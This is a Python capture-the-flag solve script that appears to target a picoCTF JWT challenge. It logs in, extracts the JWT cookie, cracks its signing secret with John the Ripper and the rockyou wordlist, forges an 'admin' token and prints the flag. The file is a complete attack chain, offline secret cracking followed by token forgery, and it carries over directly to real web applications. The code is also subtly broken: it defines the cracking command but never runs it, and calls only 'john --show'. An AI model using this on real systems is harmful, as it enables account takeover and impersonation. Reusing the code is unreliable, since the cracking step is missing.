#!/usr/bin/env python3

import requests
import subprocess
import re
import jwt

# CHANGE ME
wordlistFile = 'rockyou.txt'

# Log as any user and get a corresponding jwt token
targetUrl = 'https://jupiter.challenges.picoctf.org/problem/61864/#'
payload = {'user': 'duck'}
session = requests.Session()
session.post(targetUrl, data=payload)
jwtToken = session.cookies.get_dict()['jwt']

# Save extracted jwt token so that john can read and crack it
jwtFile = 'extractedToken.txt'
with open(jwtFile, 'x', encoding='utf-8') as f:
    f.write(jwtToken)

# Crack jwt 'secret' with John The Ripper
crackArgs = ['john', f'--wordlist={wordlistFile}', '--format=HMAC-SHA256', jwtFile]
showArgs  = ['john', '--show', jwtFile]

output = subprocess.run(showArgs, capture_output=True, text=True).stdout
extractRegex = r':(.*)'
secret = re.search(extractRegex, output).group(1)

# Forge new jwt token cookie with our data
forgedData = {'user': 'admin'}
newToken = jwt.encode(forgedData, secret, algorithm='HS256').decode('utf-8')
forgedCookie = {'jwt': newToken}

# Profit
r = requests.get(targetUrl, cookies=forgedCookie)
flagRegex = r'picoCTF{[^}]*}'
flag = re.search(flagRegex, r.text).group(0)
print(f'Flag: {flag}')

